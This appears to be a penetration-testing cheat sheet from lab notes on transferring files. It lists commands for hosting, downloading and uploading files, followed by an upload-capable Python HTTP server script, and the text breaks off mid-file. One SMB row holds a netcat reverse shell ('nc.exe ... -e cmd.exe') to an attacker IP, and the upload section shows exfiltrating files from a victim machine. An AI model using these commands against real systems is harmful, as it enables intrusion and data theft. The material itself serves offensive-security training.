<p>Files can be hosted using methods such as web servers, FTP, SMB etc. The cheat sheet below provides with some of the most common techniques that can be used to host files:</p>
<div class="table-wrapper"><table><thead><tr><th></th><th></th></tr></thead><tbody>
<tr><td><strong>Command</strong></td><td><strong>Description</strong></td></tr>
<tr><td>python -m SimpleHTTPServer [PORT]  <br>python3 -m http.server [PORT]</td><td>Python HTTP Server modules</td></tr>
<tr><td>service apache2 start; systemctl start apache2;</td><td>Apache web server, requires to place files in the /var/www/html/ directory</td></tr>
<tr><td>service nginx start; systemctl start nginx</td><td>Nginx web server, requires to place files in or /usr/share/nginx/html or /var/www/html</td></tr>
<tr><td>php -S 0.0.0.0:PORT</td><td>PHP builtin web server bundle</td></tr>
<tr><td>nc -q 0 -lvp 443 &lt; file</td><td>Netcat listener to transfer files</td></tr>
<tr><td>nc -nv IP_ADDR 443 &lt; file</td><td>Netcat command to send files</td></tr>
<tr><td>smbserver.py SHARE share_dir                                            or                                                                                             impacket-smbserver -smb2support Share /home/kali/Documents/pen200/PG/Jacko                         or                   smbserver.py -smb2support -username evil -password evil evil $PWD<br>                                      then                                                                       net use z: \192.168.49.57\evil /user:evil evil<br>Z:\nc.exe 192.168.49.57 80 -e cmd.exe<br></td><td>Impacket’s smbserver.py script simulates a SMB server</td></tr>
<tr><td>service smbd start; systemctl start smbd</td><td>Linux Samba, a share has to be added to /etc/samba/smb.conf</td></tr>
<tr><td>service pure-ftpd start; systemctl start pure-ftpd; service proftpd start; systemctl start proftpd</td><td>Services such as pure-ftpd and proftpd can be used to setup FTP servers</td></tr>
<tr><td>atftpd –daemon –port 69 ftp_dir</td><td>The atftpd utility allows to easily setup a TFTP server</td></tr>
<tr><td>ruby -rwebrick -e’WEBrick::HTTPServer.new(:Port =&gt; PORT, :DocumentRoot =&gt; Dir.pwd).start’</td><td>Ruby web server using the Web brick library</td></tr>
<tr><td>ruby -run -e httpd . -p [PORT]</td><td>Ruby simple http server</td></tr>
<tr><td>cpan HTTP::Server::Brick;  <br>perl -MHTTP::Server::Brick -e ‘$s=HTTP::Server::Brick-&gt;new(port=&gt;PORT); $s-&gt;mount(“/”=&gt;{path=&gt;”.”}); $s-&gt;start’</td><td>Perl Brick HTTP Server</td></tr>
<tr><td>“C:\Program Files (x86)\IIS Express\iisexpress.exe” /path:C: /port:PORT</td><td>Microsoftg IIS Express</td></tr>
<tr><td>base64 file;</td><td>Encoding the the file using base 64 and decoding it in the target machine</td></tr>
</tbody></table>
</div>
<h3 id="downloading-files"><a class="header" href="#downloading-files"><strong>Downloading Files</strong></a></h3>
<p>Files can be downloaded through the use of various tools such as wget/curl FTP, SMB etc. The cheat sheet below provides with some of the most common techniques that can be used to host files:</p>
<div class="table-wrapper"><table><thead><tr><th></th><th></th></tr></thead><tbody>
<tr><td><strong>Command</strong></td><td><strong>Description</strong></td></tr>
<tr><td>wget http://ip-addr:port/file [-o output_file]</td><td>Wget comes preinstalled with most Linux systems</td></tr>
<tr><td>curl http://ip-addr:port/file -o output_file</td><td>Curl comes preinstalled with most Linux and some Windows systems</td></tr>
<tr><td>certutil -urlcache -split -f “http://ip-addr:port/file” output_file</td><td>Certutil is a Windows builtin command line tool</td></tr>
<tr><td>iwr -uri http://ip:9090/name -Outfile name</td><td>Powershell</td></tr>
<tr><td>powershell -c Invoke-WebRequest -Uri http://ip-addr:port/file -OutFile output_file;  <br>powershell -c (New-Object Net.WebClient).DownloadFile(‘http://ip-addr:port/file’, ‘output_file’)</td><td>Powershell Invoke-WebRequest cmdlet or the System.Net.WebClient class</td></tr>
<tr><td>bitsadmin /transfer job /download /priority high http://IP_ADDR/file output_file</td><td>Bitsadmin Windows command-line tool</td></tr>
<tr><td>nc -nv IP_ADDR 443 &gt; file</td><td>Netcat command to download files from a Netcat listener</td></tr>
<tr><td>nc -q 0-lvp 443 &gt; file</td><td>Netcat listener to receive files</td></tr>
<tr><td>copy \IP_ADDR\SHARE\output_file</td><td>Copy command to download files from an SMB share</td></tr>
<tr><td>smbget smb://domain;user[:password@]server/share/path/file</td><td>smbget utility to download files from a Samba share</td></tr>
<tr><td>Wget  <br>wget ftp://user:password@IP_ADDR/path/file -o output_file  <br>FTP  <br>echo open 192.168.1.64 21&gt; ftp.txt  <br>echo anonymous&gt;&gt; ftp.txt  <br>echo ftp@ftp.com&gt;&gt; ftp.txt  <br>echo bin &gt;&gt; ftp.txt  <br>echo get test.txt &gt;&gt; ftp.txt  <br>echo bye &gt;&gt; ftp.txt  <br>ftp -s:ftp.txt</td><td>Wget and FTP to download files from an FTP server</td></tr>
<tr><td>tftp</td><td>tftp -i IP_ADDR {GET | PUT} file</td></tr>
<tr><td>scp /path/file username@IP_ADDR:/path/file</td><td>Secure File Copy SSH tool</td></tr>
<tr><td><a href="https://gist.github.com/Richienb/51021a1c16995a07478dfa20a6db725c">https://gist.github.com/Richienb/51021a1c16995a07478dfa20a6db725c</a></td><td>Windows Virtual Basic scripts</td></tr>
<tr><td>php -r “file_put_contents(‘output_file’, fopen(‘http://ip-addr:port/file’, ‘r’));”</td><td>PHP file_put_contents function</td></tr>
<tr><td>python -c ‘from urllib import urlretrieve; urlretrieve(“http://ip-addr:port/file”, “output_file”)’;  <br>python3 -c ‘from urllib.request import urlretrieve; urlretrieve(“http://ip-addr:port/file”, “output_file”)’</td><td>The Python urlretrieve function which is part of the urllib library can be used to download files</td></tr>
<tr><td>perl -MLWP::Simple -e ‘getstore(“http://IP_ADDR/file”, “out_file”)’;  <br>perl -e ‘use LWP::Simple; getstore(“http://IP_ADDR/file”, “out_file”)’</td><td>Library for WWW in Perl</td></tr>
<tr><td>ruby -e ‘require “open-uri”;File.open(“output_file”, “wb”) do |file|;URI.open(“http://ip-addr:port/file”).read;end’</td><td>Ruby Open-URI library</td></tr>
<tr><td>echo -n “base64-output” &gt; file</td><td>Decoding the base64 output of the file</td></tr>
</tbody></table>
</div>
<h3 id="uploading-file-back-to-kali"><a class="header" href="#uploading-file-back-to-kali">Uploading file back to Kali</a></h3>
<pre><code>When using the python upload script:

On Attacker: python3 SimpleHTTPServerWithUpload.py

On Victim:  Change the path of the file to be transferred
powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\Users\marcus\20240203152300_BloodHound.zip')"

When using updog:

On Victim:  Change the path of the file to be transferred
curl -F 'file=@/opt/backup/file.zip' http://&lt;IP&gt;:8000/

OR 

curl -v -XPOST -F "file=@/home/anita/arat/test1;filename=test1" -F "path=/home/kali/Desktop/pen200/relia" http://192.168.45.219:9090/upload
</code></pre>
<h3 id="simplehttpserverwithuploadpy"><a class="header" href="#simplehttpserverwithuploadpy">SimpleHTTPServerWithUpload.py</a></h3>
<pre><code>***SimpleHTTPServerWithUpload.py

#!/usr/bin/env python3
 
"""Simple HTTP Server With Upload.

This module builds on http.server by implementing the standard GET
and HEAD requests in a fairly straightforward manner.

see: https://gist.github.com/UniIsland/3346170
"""
 
 
__version__ = "0.1"
__all__ = ["SimpleHTTPRequestHandler"]
__author__ = "bones7456"
__home_page__ = "https://gist.github.com/UniIsland/3346170"
 
import os, sys
import os.path, time
import posixpath
import http.server
import socketserver
import urllib.request, urllib.parse, urllib.error
import html
import shutil
import mimetypes
import re
import argparse
import base64

from io import BytesIO

def fbytes(B):
   'Return the given bytes as a human friendly KB, MB, GB, or TB string'
   B = float(B)
   KB = float(1024)
   MB = float(KB ** 2) # 1,048,576
   GB = float(KB ** 3) # 1,073,741,824
   TB = float(KB ** 4) # 1,099,511,627,776

   if B &lt; KB:
      return '{0} {1}'.format(B,'Bytes' if 0 == B &gt; 1 else 'Byte')
   elif KB &lt;= B &lt; MB:
      return '{0:.2f} KB'.format(B/KB)
   elif MB &lt;= B &lt; GB:
      return '{0:.2f} MB'.format(B/MB)
   elif GB &lt;= B &lt; TB:
      return '{0:.2f} GB'.format(B/GB)
   elif TB &lt;= B:
      return '{0:.2f} TB'.format(B/TB)

class SimpleHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
 
    """Simple HTTP request handler with GET/HEAD/POST commands.

    This serves files from the current directory and any of its
    subdirectories.  The MIME type for files is determined by
    calling the .guess_type() method. And can reveive file uploaded
    by client.

    The GET/HEAD/POST requests are identical except that the HEAD
    request omits the actual contents of the file.

    """
 
    server_version = "SimpleHTTPWithUpload/" + __version__
 
    def do_GET(self):
        """Serve a GET request."""
        f = self.send_head()
        if f:
            self.copyfile(f, self.wfile)
            f.close()
 
    def do_HEAD(self):
        """Serve a HEAD request."""
        f = self.send_head()
        if f:
            f.close()
 
    def do_POST(self):
        """Serve a POST request."""
        r, info = self.deal_post_data()
        print((r, info, "by: ", self.client_address))
        f = BytesIO()
        f.write(b'&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;')
        f.write(b"&lt;html&gt;\n&lt;title&gt;Upload Result Page&lt;/title&gt;\n")
        f.write(b'&lt;style type="text/css"&gt;\n')
        f.write(b'* {font-family: Helvetica; font-size: 16px; }\n')
        f.write(b'a { text-decoration: none; }\n')
        f.write(b'&lt;/style&gt;\n')
        f.write(b"&lt;body&gt;\n&lt;h2&gt;Upload Result Page&lt;/h2&gt;\n")
        f.write(b"&lt;hr&gt;\n")
        if r:
            f.write(b"&lt;strong&gt;Success!&lt;/strong&gt;")
        else:
            f.write(b"&lt;strong&gt;Failed!&lt;/strong&gt;")
        f.write(info.encode())
        f.write(("&lt;br&gt;&lt;br&gt;&lt;a href=\"%s\"&gt;" % self.headers['referer']).encode())
        f.write(b"&lt;button&gt;Back&lt;/button&gt;&lt;/a&gt;\n")
        f.write(b"&lt;hr&gt;&lt;small&gt;Powered By: bones7456&lt;br&gt;Check new version ")
        f.write(b"&lt;a href=\"https://gist.github.com/UniIsland/3346170\" target=\"_blank\"&gt;")
        f.write(b"here&lt;/a&gt;.&lt;/small&gt;&lt;/body&gt;\n&lt;/html&gt;\n")
        length = f.tell()
        f.seek(0)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", str(length))
        self.end_headers()
        if f:
            self.copyfile(f, self.wfile)
            f.close()

    def deal_post_data(self):
        uploaded_files = []   
        content_type = self.headers['content-type']
        if not content_type:
            return (False, "Content-Type header doesn't contain boundary")
        boundary = content_type.split("=")[1].encode()
        remainbytes = int(self.headers['content-length'])
        line = self.rfile.readline()
        remainbytes -= len(line)
        if not boundary in line:
            return (False, "Content NOT begin with boundary")
        while remainbytes &gt; 0:
            line = self.rfile.readline()
            remainbytes -= len(line)
            fn = re.findall(r'Content-Disposition.*name="file"; filename="(.*)"', line.decode())
            if not fn:
                return (False, "Can't find out file name...")
            path = self.translate_path(self.path)
            fn = os.path.join(path, fn[0])
            line = self.rfile.readline()
            remainbytes -= len(line)
            line = self.rfile.readline()
            remainbytes -= len(line)
            try:
                out = open(fn, 'wb')
            except IOError:
                return (False, "&lt;br&gt;&lt;br&gt;Can't create file to write.&lt;br&gt;Do you have permission to write?")
            else:
                with out:                    
                    preline = self.rfile.readline()
                    remainbytes -= len(preline)
                    while remainbytes &gt; 0:
                        line = self.rfile.readline()
                        remainbytes -= len(line)
                        if boundary in line:
                            preline = preline[0:-1]
                            if preline.endswith(b'\r'):
                                preline = preline[0:-1]
                            out.write(preline)
                            uploaded_files.append(fn)
                            break
                        else:
                            out.write(preline)
                            preline = line
        return (True, "&lt;br&gt;&lt;br&gt;'%s'" % "'&lt;br&gt;'".join(uploaded_files))
 
    def send_head(self):
        """Common code for GET and HEAD commands.

        This sends the response code and MIME headers.

        Return value is either a file object (which has to be copied
        to the outputfile by the caller unless the command was HEAD,
        and must be closed by the caller under all circumstances), or
        None, in which case the caller has nothing further to do.

        """
        path = self.translate_path(self.path)
        f = None
        if os.path.isdir(path):
            if not self.path.endswith('/'):
                # redirect browser - doing basically what apache does
                self.send_response(301)
                self.send_header("Location", self.path + "/")
                self.end_headers()
                return None
            for index in "index.html", "index.htm":
                index = os.path.join(path, index)
                if os.path.exists(index):
                    path = index
                    break
            else:
                return self.list_directory(path)
        ctype = self.guess_type(path)
        try:
            # Always read in binary mode. Opening files in text mode may cause
            # newline translations, making the actual size of the content
            # transmitted *less* than the content-length!
            f = open(path, 'rb')
        except IOError:
            self.send_error(404, "File not found")
            return None
        self.send_response(200)
        self.send_header("Content-type", ctype)
        fs = os.fstat(f.fileno())
        self.send_header("Content-Length", str(fs[6]))
        self.send_header("Last-Modified", self.date_time_string(fs.st_mtime))
        self.end_headers()
        return f
 


    def list_directory(self, path):
        """Helper to produce a directory listing (absent index.html).

        Return value is either a file object, or None (indicating an
        error).  In either case, the headers are sent, making the
        interface the same as for send_head().

        """
        try:
            list = os.listdir(path)
        except os.error:
            self.send_error(404, "No permission to list directory")
            return None
        enc = sys.getfilesystemencoding()
        list.sort(key=lambda a: a.lower())
        f = BytesIO()
        displaypath = html.escape(urllib.parse.unquote(self.path))
        f.write(b'&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;')
        f.write(b'&lt;html&gt;\n')
        f.write(('&lt;meta http-equiv="Content-Type" '
                 'content="text/html; charset=%s"&gt;' % enc).encode(enc))
        f.write(("&lt;title&gt;Directory listing for %s&lt;/title&gt;\n" % displaypath).encode(enc))
        f.write(b'&lt;style type="text/css"&gt;\n')
        f.write(b'* {font-family: Helvetica; font-size: 16px; }\n')
        f.write(b'a { text-decoration: none; }\n')
        f.write(b'a:link { text-decoration: none; font-weight: bold; color: #0000ff; }\n')
        f.write(b'a:visited { text-decoration: none; font-weight: bold; color: #0000ff; }\n')
        f.write(b'a:active { text-decoration: none; font-weight: bold; color: #0000ff; }\n')
        f.write(b'a:hover { text-decoration: none; font-weight: bold; color: #ff0000; }\n')
        f.write(b'table {\n  border-collapse: separate;\n}\n')
        f.write(b'th, td {\n  padding:0px 10px;\n}\n')
        f.write(b'&lt;/style&gt;\n')
        f.write(("&lt;body&gt;\n&lt;h2&gt;Directory listing for %s&lt;/h2&gt;\n" % displaypath).encode(enc))
        f.write(b"&lt;hr&gt;\n")
        f.write(b"&lt;form ENCTYPE=\"multipart/form-data\" method=\"post\"&gt;")
        f.write(b"&lt;input name=\"file\" type=\"file\" multiple/&gt;")
        f.write(b"&lt;input type=\"submit\" value=\"upload\"/&gt;&lt;/form&gt;\n")
        f.write(b"&lt;hr&gt;\n")
        f.write(b'&lt;table&gt;\n')
        f.write(b'&lt;tr&gt;&lt;td&gt;&lt;img src="data:image/gif;base64,R0lGODlhGAAYAMIAAP///7+/v7u7u1ZWVTc3NwAAAAAAAAAAACH+RFRoaXMgaWNvbiBpcyBpbiB0aGUgcHVibGljIGRvbWFpbi4gMTk5NSBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tACH5BAEAAAEALAAAAAAYABgAAANKGLrc/jBKNgIhM4rLcaZWd33KJnJkdaKZuXqTugYFeSpFTVpLnj86oM/n+DWGyCAuyUQymlDiMtrsUavP6xCizUB3NCW4Ny6bJwkAOw==" alt="[PARENTDIR]" width="24" height="24"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="../" &gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;\n')
        for name in list:
            dirimage = 'data:image/gif;base64,R0lGODlhGAAYAMIAAP///7+/v7u7u1ZWVTc3NwAAAAAAAAAAACH+RFRoaXMgaWNvbiBpcyBpbiB0aGUgcHVibGljIGRvbWFpbi4gMTk5NSBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tACH5BAEAAAEALAAAAAAYABgAAANdGLrc/jAuQaulQwYBuv9cFnFfSYoPWXoq2qgrALsTYN+4QOg6veFAG2FIdMCCNgvBiAxWlq8mUseUBqGMoxWArW1xXYXWGv59b+WxNH1GV9vsNvd9jsMhxLw+70gAADs='
            fullname = os.path.join(path, name)
            displayname = linkname = name
            fsize = fbytes(os.path.getsize(fullname))
            created_date = time.ctime(os.path.getctime(fullname))
            # Append / for directories or @ for symbolic links
            if os.path.isdir(fullname):
                dirimage = 'data:image/png;base64,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'
                displayname = name + "/"
                linkname = name + "/"
                fsize = ''
                created_date = ''
            if os.path.islink(fullname):
                dirimage = 'data:image/gif;base64,R0lGODlhGAAYAPf/AJaWlpqampubm5ycnJ2dnZ6enp+fn6CgoKGhoaKioqOjo6SkpKWlpaampqioqKmpqaqqqqurq6ysrK2tra6urq+vr7CwsLGxsbKysrOzs7S0tLW1tba2tre3t7i4uLm5ubq6uru7u7y8vL29vb6+vr+/v8LCwsPDw8bGxtDQ0NTU1NXV1dbW1tfX19jY2Nra2tzc3N3d3eDg4OHh4eLi4uPj4+Tk5OXl5efn5+np6erq6uvr6+zs7O7u7u/v7/Dw8PHx8fLy8vPz8/T09PX19fb29vf39/j4+Pr6+vv7+/39/f7+/v///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAGAAYAAAI/wCZCBxIsKDBgwgLrsigwUXChEVGYNBwIYKIJA8LFunwocKGDA8ieMg4kAiHDxRmCGyhIAEKkhtR2iCYYYEAkiNQ3ijYIQGAjDkuVFBJsIcBAhcyttCgoSCQBQcUFMn44gIFEiwE/oAqIAfJIREeQLDAZIeCAwO8IuQRowYSIxQgBFhAoQBatQaFiLCQoQIFCxEMREUwoAEPhEA0dMQwQSwCIEFYpKCR8IfiCjWYgJCr4AhJyx13CFRhQYECGBmRcKwgmmAEBCsyltBQQUfBGwUG4MjoYMOIgjsSIJBAskGGEAR3IEhw4AdJExIeyBCIY/kBHySZLNEwgcGGDQYQNBbPLpAIBgULEhB4AIQ8wRMFBIhQ4j4gADs='
                displayname = name + "@"
            if name.endswith(('.bmp','.gif','.jpg','.png')):
                dirimage = name
            if name.endswith(('.avi','.mpg')):
                dirimage = 'data:image/gif;base64,R0lGODlhGAAYAMIAAP///7+/v7u7u1ZWVTc3NwAAAAAAAAAAACH+RFRoaXMgaWNvbiBpcyBpbiB0aGUgcHVibGljIGRvbWFpbi4gMTk5NSBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tACH5BAEAAAEALAAAAAAYABgAAANvGLrc/jAuQqu99BEh8OXE4GzdYJ4mQIZjNXAwp7oj+MbyKjY6ntstyg03E9ZKPoEKyLMll6UgAUCtVi07xspTYWptqBOUxXM9scfQ2Ttx+sbZifmNbiLpbEUPHy1TrIB1Xx1cFHkBW4VODmGNjQ4JADs='
            if name.endswith(('.idx','.srt','.sub')):
                dirimage = 'data:image/gif;base64,R0lGODlhGAAYAPf/AAAbDiAfDSoqHjQlADs+J3sxJ0BALERHMk5LN1pSPUZHRk9NQU1OR05ZUFBRRFVXTVdYTVtVQFlVRFtbSF5bTVZWUltbUFlZVFtcVlxdWl5eWl1gWmBiV2FiXWNhXGRjXWlpYmtqZ2xtZmxsaG5ubHJva3Jzb3J0bHN0b3Z5dHd8eXh4dX18dXx/dnt8e31+eahMP4JdWIdnZox4cpVoYKJkXrxqablwcNA6Otg7O/8AAPwHB/0GBvgODvsMDPMbG/ceHvkSEuYqKvYqKvU2NvM6OvQ6OsFQUNVbW8N4eNd0duNeXu9aWvFUVOVqau1jY+1mZu5mZuh5eYSFgIWGgYaFgIiGgYqKiY6LioyMiY2NiYyMio2OiI6OjZCSjZSQi5OSkJGUkpSVk5WVlJWVlZiZlpiZmJ6emp2dnZSko6GhnKGhoKOjoaKnoqSkpKSmpKWmpaampqqrqKurqKqrqq2sqq6urrSyrrCwsLa3tb63tbi4t7q6ur+/vsCbm96Li9iUlMqursmwr9KwsN69veSCguiMjOiOjuaQkOWVleaXmOGfn+aYmOaamuebm+adneecnOeenuiQkOWgoOWsrOasrOWxseW2tue3t+e8vOi+vsHBwcfHx8jIxs7Mx8nJyMvLy8zMy83NzM7Pzs/Pz9PR0dTU1NXV1dXW1tbW1tfX19bb29jY2NnZ2djb29ra2tvb2tvb29za2tzc3N3d3d7e3t/f3+bCwufDw+fGxuTJyejCwujHx+nHx+vPz+rT0+rU1OrX1+vX1+rY2Ojf3+Hh4eLi4uPj4+Hn5+Tk5OXl5ebm5ufn5+nn5+jo6Onp6erp6evr6+zs7PDn5/Dq6vDt7fHv7/Lu7vPu7vPv7/Dw8PHx8fLy8vPz8/Tx8fbz8/T09PX19fX39/b29vj39/j4+Pn4+Pn5+fr5+fr6+vv7+/z7+/z8/P39/f7+/v/+/v///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAGAAYAAAI/wDhCRxIsKDBgwgTZis00F27hAbRNSpSaSC7ZM6ePQsXjdmzZekKUpOio0lBVShjJXvYjp07gsEm/dLhqKC2aNG2LesES13BXJTg4dLBi2C7kPDSyQFTRY26c8akZbolkJGOaQTZFTO2LA8KCCA+zDFTp4aggVCCmCtYrJUxNiI4nAjh4o2HGW1CrhvCxGC5cOVqvcCgQQUWGRtanOkG75qOQwXbhWvZ7lOZMIGSsJjihY5AYTowFWRnipUtT6BGWIARY8IXPc1eXtIxrKC7cqJCjdJCIcIBAwRoaLqU6IkRHthGnwPzoEGKDBISMHDAZWAvHUTWjaa1J42NAgAELMBAMGCNwHbWekQxqA4VMkBKSokZE8AKtHLpjuHxo0OSQXfuLKJIOHdc0IECFaxgQivpxHGDDpYc9McS5oBTAhxUbNHFFX2I4Q4fR+iwi0GPCCGLK6rYgQYJWZDhBil7cMMJDjpAAg85L8ETCRDVqAONMuGMA0446rDjEzzi5KDDD4j48g48huxAyCqtODNZOeWcM85DAxEDzDcE+YDEK5u0EostbZ2SyizsQASPE4PAo4466TxVZzptuqmLN266GRAAOw=='
            if name.endswith('.iso'):
                dirimage = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAABmJLR0QA/wD/AP+gvaeTAAANQUlEQVRoge2ZW4ykR3XHf6eqvkt3z2VnvevFu8viGG+IbO86IVFi5QGIEFYMtsRLXkiIDBaKFRyIoigoIkFLFMNDFCFbYIhsQxQlQYmyWNgh+MEoUpBtxXkADDZmbWMb33b2Ppfu71ZVJw/V0zOzMzuzdnB44Uit7v6+qv7O//zPOfWvavi5/WxNfho/Mv/Q7XsWG/0swo0x+n70ZF7bvAsBHzt89IAgKM5azSV7aW6mf92B64+88n999usGoHrEPPPN7N+Lnb3fRqN0TUOoK9phS6g9dVfThobaN7Sxm8yzYumXA6YHcxQu74wr7nrbjeFPRI7E/zcAzz50+7FsujxoMsAoGiPdqMUPW/wovWrfUIeGuqvoop/MzU1G7nIKm1O4giwryPuDF401/3Dle//yL95QAM8+ePv7VPR+m4sxfYstXLqhSqg87bDBj2q65ZYmtNRdReXrCQABcltQuiKBMDkiyQXjHFl/8JTD3fbWmz75rYv1yVzswGP3HznaVKMH2mrZdF1L7AIaNd0UAScYazBiERFEFBB0TYxEBGtMesdMnAeI3tMsLvxS21UPHPuPv/6bi/VrWwZUj5hjR/3pbnm4I1owuSPrF9hBRjYosbkFAQ2RdqmhGzZ0yzVN01J1Q6pQ04XEgDWW0paUWUHPFIjZPH7GZWT96W/+4o3+xu1qY0sGVI+YH/1T07UvntkRl2toAtF7QtcR24hvPKqJBTEG4wxiBMFgJMVnLQPGCM4YnLgLOg8QfUe7vHDDM9+Q/1Q9sqWPW9586svDrn1+3sRhjVYBWg9tJLSe0LTEriO2AVK2IM5grCBW0jUDrAAEnDiscVjZvvQ0Bpql5Xc8/XW+97oA/PDv//QFf/ys0aqDxkPj0aqD2qNNINQerbv0Pq4FcTa9LGCEVAYrAAwGgzUWI25bAIhgcgfOXnPsgU8/9JoAHDv6qffFs/WBOGrShagJRBXQ2kPliV2gqzyh7Yhth6pijIxZsAjjAhvX+Ur6WCzbESBGcL0+Wb+PK3tkUzPvfvrrf/XhzcZuGoowbB7wy0OwBkJcD8JI8swoasA3FptZTJHy2lmDN4IRAxh07KwVhxGHtVs3PmMttuzhyh6uLHF5iSkKXJbfA3x5w/jzL/zo6Kfu9KORSC+HXgaFWe1VUaHu0FEHdSDWgTD0+LojVD6le5YhzjKZFJOIcMbgTIbZouxMluEGU+SDKbL+gKw/RTbok/f79HZfKj/59p1ntwSgesSE6G9RKzDlkIGFXg5lBm7sUNBUB6MOhi2x6fDDjlC3aIwYB2LHPV4EFUUQrGRk9kK5L9iiIO9PkQ+myfvTFNPT5FMDssEMWX+aYmYHvZ17dpzfldb94tNH45+Hru3TdxAsZIJkEXKLNgbqAF1IIEYdSuo4wRm6ymCKDAmCLrTkneESZtiZT+M1EEUxatFxUa/xHdcrycsp3KCPK/tkZQ9blNiywOYlLs8Q6+jt2sWJx69cBvqbAgiE96uOc94K2ByyCFlAMkEzA7VJteAjDNuU4